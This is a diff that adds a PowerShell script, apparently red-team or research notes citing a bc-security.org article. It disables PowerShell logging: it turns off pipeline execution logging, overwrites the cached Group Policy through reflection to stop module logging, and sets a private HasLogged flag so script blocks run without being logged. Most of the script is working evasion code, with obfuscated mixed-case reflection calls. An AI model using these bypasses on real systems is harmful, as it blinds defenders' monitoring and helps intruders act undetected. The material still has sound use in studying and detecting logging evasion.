@@ -1,0 +1,25 @@
+$module = Get-Module Microsoft.PowerShell.Utility
+$module.LogPipelineExecutionDetails = $false
+$Snapin = Get-PSSnapin Microsoft.PowerShell.Core
+$Snapin.LogPipelineExecutionDetails = $false
+#https://bc-security.org/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/
+
+$GroupPolicy =[ReF].assembly.GetType('System.Management.Automation.Utils').GetFielD('cachedGroupPolicySettings','NonPublic,Static').GetValue($nULL);
+$val=[Collections.Generic.Dictionary[String,System.Object]]::new();
+$Val.Add('EnableModuleLogging',0);
+$Val.add('ModuleNames', '');
+$GroupPolicy['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging']=$VaL
+Import-Module Microsoft.Powershell.Utility -Force
+
+$code = ...
+Add-Type $code
+$WriteHello = [System.Management.Automation.CmdletInfo]::new("Write-Hello", [WriteHello])
+& $WriteHello -msg "abcd"
+
+Get-Command Write-Host | fl * # implementing type
+
+$Cmd = [System.Management.Automation.CmdletInfo]::new("Write-Host", [Microsoft.PowerShell.Commands.WriteHostCommand])
+
+$script = [ScriptBlock]::new("Write-host 'sad'")
+[ScriptBlock].getproperty("HasLogged",@('nonpublic','instance')).setvalue($script, $true)
+$script.invoke()
